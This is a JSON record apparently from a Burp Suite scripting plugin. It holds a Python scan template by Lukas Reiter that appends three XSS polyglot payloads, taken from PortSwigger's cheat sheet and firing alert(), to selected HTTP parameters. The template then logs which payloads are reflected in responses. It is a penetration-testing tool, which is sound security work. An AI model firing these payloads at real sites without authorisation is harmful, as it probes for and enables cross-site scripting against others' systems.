{
    "author": "Lukas Reiter", 
    "plugins": [
        7
    ], 
    "burp_professional_only": false, 
    "uuid": "208194da-3428-4ebd-88f8-e1b393f0d193", 
    "version": "v0.5", 
    "script": "\"\"\"\r\nThis script appends XSS polygots to all user-selected parameters.\r\n\"\"\"\r\n\r\nimport string\r\nfrom turbominer.scanning import ReflectedPayload as Payload\r\nfrom turbominer.scanning import SniperScanParameterBase\r\nfrom turbominer.analysis import ResponseMissingException\r\n\r\n\r\nclass SniperScanParameter(SniperScanParameterBase):\r\n\tdef __init__(self, **kwargs):\r\n\t\tSniperScanParameterBase.__init__(self, **kwargs)\r\n\r\n\tdef notify_scan_item_completed(self, category, start_time, end_time, payload, parameter, original_message, new_message, redirect_message):\r\n\t\thit = payload.check_response(redirect_message, parameter)\r\n\t\treflected_value = \", \".join(payload.reflected_values)\r\n\t\trow = [ref, original_message.http_method, original_message.host_name, original_message.url.getPath(), parameter.type_str, parameter.name, parameter.value, payload.payload, reflected_value, payload.comment, hit, (end_time - start_time).microseconds, original_message.status_code, original_message.response_content_length, new_message.status_code, new_message.response_content_length]\r\n\t\tif new_message.message_info == redirect_message.message_info:\r\n\t\t\tadd_row(row, {category: new_message.message_info})\r\n\t\telse:\r\n\t\t\tadd_row(row, {category: new_message.message_info, \"Redirect\": redirect_message.message_info})\r\n\r\n\r\nif ref == 1:\r\n\theader = [\"Ref.\", \"Method\", \"Host\", \"URL\", \"Type\", \"Parameter\", \"Value\", \"Payload\", \"Reflected Value\", \"Comment\", \"Hit\", \"Response Timer\", \"Status Code\", \"Content Length\", \"Status Code (Payload)\", \"Content Length (Payload)\"]\r\n\t# Create payloads\r\n\tpattern = \"ohN3x\"\r\n\tsession = {}\r\n\t# List of XSS polygots to be tested\r\n\t# Source: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#polyglots\r\n\tsession[\"XSS Polygot\"] = [Payload(\"\", append=True),\r\n\t\tPayload(\"\"\"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>\"\"\", url_encode=True, expected_value=\"ja\", append=True),\r\n\t\tPayload(\"\"\"javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\"\r\n onmouseover=/*&lt;svg/*/onload=alert()//>\"\"\", url_encode=True, expected_value=\"ja\", append=True),\r\n\t\tPayload(\"\"\"javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/\"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>\"\"\", url_encode=True, expected_value=\"ja\", append=True)]\r\n\r\nscanner = SniperScanParameter(core=core, payloads=session, max_redirects=2)\r\nscanner.scan(message_info)\r\n", 
    "name": "Scan - Template Script to Inject XSS Polygots Into Selected Parameters"
}